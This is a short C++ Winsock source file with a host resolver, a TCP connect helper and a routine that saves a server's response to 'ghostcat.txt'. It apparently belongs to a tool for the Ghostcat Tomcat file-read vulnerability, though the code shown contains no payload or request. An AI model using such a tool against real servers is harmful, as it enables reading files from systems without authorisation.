#include "hdr.h"

string getIp(string host) {
    in_addr addr;
    addr.s_addr = *(u_long*)gethostbyname(host.c_str())->h_addr_list[0];
    return inet_ntoa(addr);
}

SOCKET connect_host(string ip, string port) {
    WSADATA wd;
    SOCKET sock = INVALID_SOCKET;
    addrinfo* res = NULL, * ptr = NULL, hints;

    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) {
        return -1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(ip.c_str(), port.c_str(), &hints, &res) != 0) {
        return -2;
    }

    for (ptr = res; ptr != NULL; ptr = ptr->ai_next) {
        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            return -3;
        }

        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }

        break;
    }

    if (ptr == NULL) {
        return -4;
    }

    return sock;
}

void saveFile(SOCKET sock) {
    FILE* f = fopen("ghostcat.txt", "w");
    char buf[500];
    bool started = false;

    timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;

    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(timeval));

    while (1) {
        DWORD bytes = recv(sock, buf, 500, NULL);
        if (bytes == -1 && started) {
            fclose(f);
            return;
        }
        if (bytes != -1){
            fwrite(buf, 1, bytes, f);
            started = true;
        }
    }
}
